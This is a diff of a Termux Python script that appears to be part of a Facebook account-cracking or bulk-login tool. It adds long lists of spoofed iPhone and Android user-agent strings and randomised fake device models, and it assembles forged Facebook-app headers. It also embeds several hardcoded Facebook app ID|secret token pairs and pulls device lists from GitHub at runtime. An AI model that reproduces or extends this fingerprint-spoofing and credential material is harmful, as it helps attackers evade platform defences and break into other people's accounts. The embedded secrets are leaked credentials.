@@ -33,7 +33,7 @@ except (ModuleNotFoundError,FileNotFoundError):
     print ('\033[0;97mSomething wrong')
     exit()
     sys.exit()
-os.system('termux-setup-storage')
+#os.system('termux-setup-storage')
 os.system('ls '+'/sdcard '+'> .sd.txt')
 os.system('clear')
 rr = open('.sd.txt', 'r').read()
@@ -125,7 +125,48 @@ def convert(cok):
 
 
 
-
+ua777 = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5; like Mac OS X) AppleWebKit/600.43 (KHTML, like Gecko)  Chrome/51.0.2458.138 Mobile Safari/602.3',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_7; like Mac OS X) AppleWebKit/601.12 (KHTML, like Gecko)  Chrome/47.0.1741.400 Mobile Safari/601.4',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 7_2_5; like Mac OS X) AppleWebKit/535.37 (KHTML, like Gecko)  Chrome/55.0.1438.376 Mobile Safari/603.0',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_8; like Mac OS X) AppleWebKit/601.9 (KHTML, like Gecko)  Chrome/52.0.2927.225 Mobile Safari/535.9',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 8_2_3; like Mac OS X) AppleWebKit/534.44 (KHTML, like Gecko)  Chrome/51.0.2055.387 Mobile Safari/602.9',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_7; like Mac OS X) AppleWebKit/602.34 (KHTML, like Gecko)  Chrome/54.0.1280.327 Mobile Safari/601.2',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 10_4_9; like Mac OS X) AppleWebKit/534.26 (KHTML, like Gecko)  Chrome/49.0.1455.201 Mobile Safari/603.9',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_0; like Mac OS X) AppleWebKit/537.3 (KHTML, like Gecko)  Chrome/52.0.2335.107 Mobile Safari/603.5',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_6_7; like Mac OS X) AppleWebKit/600.40 (KHTML, like Gecko)  Chrome/48.0.1600.178 Mobile Safari/602.4',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_8; like Mac OS X) AppleWebKit/533.49 (KHTML, like Gecko)  Chrome/51.0.1116.123 Mobile Safari/600.0',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.53 Mobile/15E148 Safari/604.1',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1 OPX/1.5.2',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5339d [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5]',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5312j [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5312g [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/22.7.6.401.10 YaApp_iOS/2207.6 YaApp_iOS_Browser/2207.6 Safari/604.1 SA/3',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/218.0.456502374 Mobile/15E148 Safari/604.1',
+'Mozilla/5.0 (iPad; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/15.0 Safari/605.1.15',
+'Mozilla/5.0 (iPad; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/15.1 Safari/605.1.15',
+'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1',
+'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/76.0.3809.123 Mobile/15E148 Safari/605.1',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/113.0.5672.121 Mobile/15E148 Safari/604.1',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/113.0.5672.121 Mobile/15E148 Safari/604.1',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 17.0 like Mac OS X) AppleWebKit/(KHTML, like Gecko) Version/16.4 Mobile/Safari',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1',
+'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1',
+'Mozilla/5.0 (iPad; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/12.5.5 Safari/605.1.15',
+'Mozilla/5.0 (iPad; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/12.5.5 Safari/605.1.15',
+'Mozilla/5.0 (iPad; CPU OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBAV/183.0.0.36.93;FBBV/123940704;FBDV/iPad4,7;FBMD/iPad;FBSN/iOS;FBSV/12.0;FBSS/2;FBCR/;FBID/tablet;FBLC/es_LA;FBOP/5;FBRV/0]',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
+'Autoplius.lt/6.6.0 Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 EmbeddedBrowser DeviceUID:','Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1',
+'Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/221.0.461030601 Mobile/15E148 Safari/604.1',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.3.0 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36'
+])
 
 
 gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
@@ -274,7 +315,7 @@ for xd in range(10000):
     ugen94.append(uaku2)
     
     
-    
+for xd in range(10000):
     aa='Mozilla/5.0 (Linux; Android 13;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
     c=random.choice(['Vivo Y91C)'])
@@ -1645,31 +1686,37 @@ def S1():
 
 #__________________________gs ua
 kttjt = random.choice(['7','8','9'])
-#import random
+import random
 ghhh=requests.get('https://raw.githubusercontent.com/AKING110/files/main/model.txt').text.splitlines()
 	
 ghhh2=requests.get('https://raw.githubusercontent.com/AKING110/files/main/Brand.txt').text.splitlines()
+
+newprog1=requests.get('https://raw.githubusercontent.com/mdtasin123/device/main/mixpro.txt').text.splitlines()
 	
 model=random.choice(ghhh)
 B6=random.choice(ghhh2)
+nuwpro0=random.choice(newprog1)
+
 
 
 def GS():
+	zxrx = random.choice(['LM-912M','Nokia Asha D465','Redmi 947','Oppo 503T','Redmi Note N607 Ultra','Huawei 164 Max','LG-662W','Honor 585 Ultra','Oppo W599 Max','Oppo 834 Ultra','Itel Q587 Ultra','Huawei 159T','Itel 756 Max','Redmi Note C166 Max','RMX4893','Redmi H757 Ultra','Nokia N580 Max','Infinix 943 Ultra','Huawei X807 Ultra','LM-X756T','Sony Xperia 572 Ultra','SM-M837F','Infinix R432T','Redmi Note U561 Max','RMX3210','Honor 214 Max','RMX1945','Realme T909 Max','Realme H235 Max','Redmi Note U239 Max','LM-M762 Max','Vivo P59 Ultra','LG-224J','Mi 879T','Honor 293 Max','Nokia Asha V494 Ultra','Nokia N681 Max','Vivo 456 Pro','RMX3586','Nokia NH268T','Itel N420V','Honor I597 Ultra','Redmi 479T','LM-466 Ultra','SM-A152D','Nokia NJ392 Max','Itel L777T','Redmi 60T','Redmi Note 962 Pr','Redmi 54 Max','Infinix Q461 Pro','RMX8103','Realme 996 Max','Redmi U486T','SM-S520B','Oppo 286 Pro','Redmi W613 Max','LG-678H','Infinix 857T','Redmi Note N195T','Oppo W434 Pro','Nokia NE122 Ultra','Redmi Note T799','Realme 729R','RMX5625','SM-S383B','Redmi 837','Vivo E394T','SM-M820B','Huawei 109 Ultra','Vivo S857P','Mi N339 Pro','Infinix A752 Max','Nokia NE172 Max','Infinix 665 Pro','Honor 520','Honor 905 Max','Redmi D75','Mi 825 Pro','LG-417Q','Sony Xperia 574T','Sony Xperia 853 Ultra','Vivo 175','LG-465E','Oppo 81 Max','Redmi 691 Ultra','Realme N310 Pro','Redmi S768L','Vivo 284L','LM-749G','Honor V125U','LM-H902','Redmi G862','Sony Xperia 33T','SM-A336ES','Oppo 898 Pro','Mi 596 Max','SM-S996ES','SM-J483ES','Mi 404 Max','RMX8626','Mi J690T','Nokia NN450 Pro','LG-278D','Infinix T195T','Honor N665 Max','Itel A978 Max','Mi I92 Pro','Huawei 534 Pro','Nokia N126J','Redmi 242 Pro','Nokia N286Y','Oppo 437','LG-224C','Sony Xperia J14 Ultra','LG-41B','Huawei 120M','Infinix 549 Pro','Itel 812 Pro','Oppo D35T','SM-M334M','Realme D350','LM-W707 Pro','Sony Xperia 579 Max','RMX3194','Vivo 856','SM-M586F','Oppo H738 Ultra','RMX1417','Infinix 747 Pro','Nokia NL792 Pro','RMX7160','Sony Xperia 126T','Realme Q85','Itel 707 Max','LG-17G','Redmi 920 Pro','Infinix P885 Pro','RMX5907','Huawei 421B','Honor 418 Pro','Huawei 808F','RMX9967','Honor 238X','Huawei 232','Honor 977 Pro','Sony Xperia 929S','Infinix Y890 Max','Infinix 962B','Oppo Z579','SM-S319F','Redmi 460 Max','Nokia NY622B','Realme L771','Oppo J267 Max','Realme M918','Honor I280 Max','Mi 127T','Itel V279','Realme O73T','RMX1619','SM-A214M','Sony Xperia O255T','Nokia NE54L','Realme 58T','Nokia Asha 432 Max','Itel 266 Ultra','LG-98J','Oppo O128T','Vivo 943','Mi F794 Max','Huawei N541 Pro','LG-373F','Honor F107 Pro','Vivo O936 Pro','SM-Ultr','Vivo G502 Pro','LG-485H','Realme 609T','Infinix 706 Max','Honor Q84 Ultra','Sony Xperia 813 Ultra','SM-M673ES','Infinix 518 Ultra','Itel T984','Sony Xperia L893 Ultra','Vivo 684 Max','Infinix V940 Max','Vivo D590 Pro','Mi 975 Pro','Sony Xperia 773 Pro','Nokia Asha 73 Ultra','Infinix 843T','Oppo T201 Ultra','Redmi 613 Pro','Redmi L514 Ultra','Honor 948T','Nokia Asha 203 Max','Oppo 818','Nokia N14A','Mi U875 Ultra','Nokia NM726K','Mi T719B','Oppo 75 Pro','Mi S406T','Nokia NE756 Pro','Huawei X889','Honor 408 Ultra','RMX1854','Honor P555L','Itel X551T','Huawei 668','Redmi I532','Itel 179','Oppo K346T','Huawei J60H','Mi R605','Honor 531F','Nokia Asha T984T','Realme L480','Sony Xperia Y565 Ultra','Realme Q166 Pro','Redmi Note A951 Max','Infinix 628 Ultra','Redmi G812 Ultra','Oppo 498 Max','Huawei P512 Ultra','Honor D965G','Huawei 949T','RMX3120','Itel 356F','Honor Y648T','SM-M314B','Nokia N519D','Honor 526T','Infinix F807','Sony Xperia Y264V','Mi 665L','RMX5778','Oppo 358T','Itel W93A','SM-N299B','Huawei N181','RMX7023','RMX4942','Redmi Note D220O','Honor 909B','Huawei 40T','LG-879D','Nokia NP718V','RMX5892','Oppo B425','LG-683T','Itel Y309I','Nokia NW596 Max','Vivo 719 Max','Sony Xperia 900T','Infinix U625I','Mi 822 Ultra','LM-432 Max','Vivo H990 Pro','Itel 438','Nokia Asha Y492 Ultra','Huawei 339A','Oppo Y224T','Redmi Note N931 Pro','Realme 425 Max','Sony Xperia T242','Oppo L476T','Redmi Note C217 Max','LG-744Z','Sony Xperia 865M','RMX5429','Sony Xperia F598','Vivo L962 Ultra','Huawei B824','LG-841M','SM-F941M','SM-J608ES','Mi Z446T','RMX7999','Vivo S20Q','Vivo F139T','Itel E300 Max','RMX6244','Redmi Note M667U','Redmi Note 656 Ultra','Nokia N745 Ultra','Realme X813Z','Vivo N177E','Redmi Note 548','Nokia Asha D465','Redmi 947','Oppo 503T','Redmi Note N607 Ultra','Huawei 164 Max','LG-662W','Honor 585 Ultra','Huawei 159T'])
 	height = random.choice(['1100','1190','1151','1280','1920','2560','3840','4096'])
 	width = random.choice(['958','807','927','720','1716','1080','1440','1920','2560'])
 	density = random.choice(['1.81','1.01','1.5','2.0','2.5','3.0','3.72'])
 	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
-	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
+	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.adsmanager','com.facebook.mlite'])
 	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
 	device02 = random.choice(['RMX3177','RMX0164','RMX8506','RMX2160','RMX0449','RMX4056','RMX6694','RMX6198','RMX1295','RMX9268','RMX1103','RMX0178','RMX8912','RMX1859','RMX3594','RMX7124','RMX2157','RMX2358','RMX8973','RMX1541','RMX6895','RMX6342','RMX1185','RMX6202','RMX1831','RMX129','RMX9715','RMX0359','RMX1113','RMX6558','RMX0943','RMX7964','RMX8232','RMX0932','RMX2240','RMX7295','RMX2883','RMX0788','RMX1661','RMX9259','RMX3284','RMX6899','RMX1711','RMX3967','RMX4942','RMX4673','RMX4560','RMX0070','RMX8875','RMX5378'])
 	device03 = random.choice(['11 Lite 5G NE','11i HyperCharge 5G','12','12 Lite','12 Pro','12 Pro Dimensity','12S','12S Pro','12S Ultra','12T','12T Pro','12X','13','13 Lite','13 Pro','13 Ultra','6','8','Black Shark','Black Shark 2','Black Shark 2 Pro','Black Shark 2Pro','Black Shark 3','Black Shark 3 5G','Black Shark 3 Pro','Black Shark 3 Pro 5G','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro'])
 	device04 = random.choice(['Infinix','Nokia','Vivo','Tecno','OnePlus','iPhone','Samsung','QMobile','Archos','TCL','HTC','LGE','bq','Google','Motrola','Xoaimi','Readmi','Realme','Huawie','Sony'])
 	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
-	e = ";FBDM/{density="+density+",width="+width+",height="+height+"};FBLC/"+en+";FBRV/"+str(random.randint(111111111,999999999)) +";FBCR/"+fbcr+";FBMF/"+model+";FBBD/"+model+";FBPN/"+kt+";FBDV/Redmi 9T NFC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
+	e = ";FBDM/{density="+density+",width="+width+",height="+height+"};FBLC/"+en+";FBRV/"+str(random.randint(111111111,999999999)) +";FBCR/"+fbcr+";FBMF/"+zxrx+";FBBD/"+zxrx+";FBPN/"+kt+";FBDV/Redmi 9T NFC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
 	ua = s + e	
 	return ua
 	
 #print(GS())
+
 
 
 
@@ -1704,6 +1751,269 @@ kttjt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.m
 devicttt0 = random.choice(['11 Lite 5G NE','11i HyperCharge 5G','12','12 Lite','12 Pro','12 Pro Dimensity','12S','12S Pro','12S Ultra','12T','12T Pro','12X','13','13 Lite','13 Pro','13 Ultra','6','8','Black Shark','Black Shark 2','Black Shark 2 Pro','Black Shark 2Pro','Black Shark 3','Black Shark 3 5G','Black Shark 3 Pro','Black Shark 3 Pro 5G','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro'])
 deviceutt = random.choice(['Infinix','Nokia','Vivo','Tecno','OnePlus','iPhone','Samsung','QMobile','Archos','TCL','HTC','LGE','bq','Google','Motrola','Xoaimi','Readmi','Realme','Huawie','Sony'])
 psggg = random.choice(['1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae','438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28','350685531728|62f8ce9f74b12f84c123cc23437a4a32','6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae'])
+
+
+mggg="""LM-912M
+Nokia Asha D465
+Redmi 947
+Oppo 503T
+Redmi Note N607 Ultra
+Huawei 164 Max
+LG-662W
+Honor 585 Ultra
+Oppo W599 Max
+Oppo 834 Ultra
+Itel Q587 Ultra
+Huawei 159T
+Itel 756 Max
+Redmi Note C166 Max
+RMX4893
+Redmi H757 Ultra
+Nokia N580 Max
+Infinix 943 Ultra
+Huawei X807 Ultra
+LM-X756T
+Sony Xperia 572 Ultra
+SM-M837F
+Infinix R432T
+Redmi Note U561 Max
+RMX3210
+Honor 214 Max
+RMX1945
+Realme T909 Max
+Realme H235 Max
+Redmi Note U239 Max
+LM-M762 Max
+Vivo P59 Ultra
+LG-224J
+Mi 879T
+Honor 293 Max
+Nokia Asha V494 Ultra
+Nokia N681 Max
+Vivo 456 Pro
+RMX3586
+Nokia NH268T
+Itel N420V
+Honor I597 Ultra
+Redmi 479T
+LM-466 Ultra
+SM-A152D
+Nokia NJ392 Max
+Itel L777T
+Redmi 60T
+Redmi Note 962 Pro
+Redmi 54 Max
+Infinix Q461 Pro
+RMX8103
+Realme 996 Max
+Redmi U486T
+SM-S520B
+Oppo 286 Pro
+Redmi W613 Max
+LG-678H
+Infinix 857T
+Redmi Note N195T
+Oppo W434 Pro
+Nokia NE122 Ultra
+Redmi Note T799
+Realme 729R
+RMX5625
+SM-S383B
+Redmi 837
+Vivo E394T
+SM-M820B
+Huawei 109 Ultra
+Vivo S857P
+Mi N339 Pro
+Infinix A752 Max
+Nokia NE172 Max
+Infinix 665 Pro
+Honor 520
+Honor 905 Max
+Redmi D75
+Mi 825 Pro
+LG-417Q
+Sony Xperia 574T
+Sony Xperia 853 Ultra
+Vivo 175
+LG-465E
+Oppo 81 Max
+Redmi 691 Ultra
+Realme N310 Pro
+Redmi S768L
+Vivo 284L
+LM-749G
+Honor V125U
+LM-H902
+Redmi G862
+Sony Xperia 33T
+SM-A336ES
+Oppo 898 Pro
+Mi 596 Max
+SM-S996ES
+SM-J483ES
+Mi 404 Max
+RMX8626
+Mi J690T
+Nokia NN450 Pro
+LG-278D
+Infinix T195T
+Honor N665 Max
+Itel A978 Max
+Mi I92 Pro
+Huawei 534 Pro
+Nokia N126J
+Redmi 242 Pro
+Nokia N286Y
+Oppo 437
+LG-224C
+Sony Xperia J14 Ultra
+LG-41B
+Huawei 120M
+Infinix 549 Pro
+Itel 812 Pro
+Oppo D35T
+SM-M334M
+Realme D350
+LM-W707 Pro
+Sony Xperia 579 Max
+RMX3194
+Vivo 856
+SM-M586F
+Oppo H738 Ultra
+RMX1417
+Infinix 747 Pro
+Nokia NL792 Pro
+RMX7160
+Sony Xperia 126T
+Realme Q85
+Itel 707 Max
+LG-17G
+Redmi 920 Pro
+Infinix P885 Pro
+RMX5907
+Huawei 421B
+Honor 418 Pro
+Huawei 808F
+RMX9967
+Honor 238X
+Huawei 232
+Honor 977 Pro
+Sony Xperia 929S
+Infinix Y890 Max
+Infinix 962B
+Oppo Z579
+SM-S319F
+Redmi 460 Max
+Nokia NY622B
+Realme L771
+Oppo J267 Max
+Realme M918
+Honor I280 Max
+Mi 127T
+Itel V279
+Realme O73T
+RMX1619
+SM-A214M
+Sony Xperia O255T
+Nokia NE54L
+Realme 58T
+Nokia Asha 432 Max
+Itel 266 Ultra
+LG-98J
+Oppo O128T
+Vivo 943
+Mi F794 Max
+Huawei N541 Pro
+LG-373F
+Honor F107 Pro
+Vivo O936 Pro
+SM-F407F
+Vivo G502 Pro
+LG-485H
+Realme 609T
+Infinix 706 Max
+Honor Q84 Ultra
+Sony Xperia 813 Ultra
+SM-M673ES
+Infinix 518 Ultra
+Itel T984
+Sony Xperia L893 Ultra
+Vivo 684 Max
+Infinix V940 Max
+Vivo D590 Pro
+Mi 975 Pro
+Sony Xperia 773 Pro
+Nokia Asha 73 Ultra
+Infinix 843T
+Oppo T201 Ultra
+Redmi 613 Pro
+Redmi L514 Ultra
